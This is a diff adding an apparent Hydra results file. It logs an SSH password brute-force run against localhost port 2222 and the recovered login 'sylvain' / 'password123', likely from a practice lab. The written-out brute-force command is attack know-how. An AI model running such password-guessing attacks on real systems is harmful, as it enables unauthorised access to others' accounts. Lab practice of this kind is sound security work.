@@ -1,0 +1,2 @@
+# Hydra v9.0 run at 2023-01-09 15:50:38 on 127.0.0.1 ssh (hydra -l sylvain -P user.txt -f -o found.txt -s 2222 127.0.0.1 ssh)
+[2222][ssh] host: 127.0.0.1   login: sylvain   password: password123
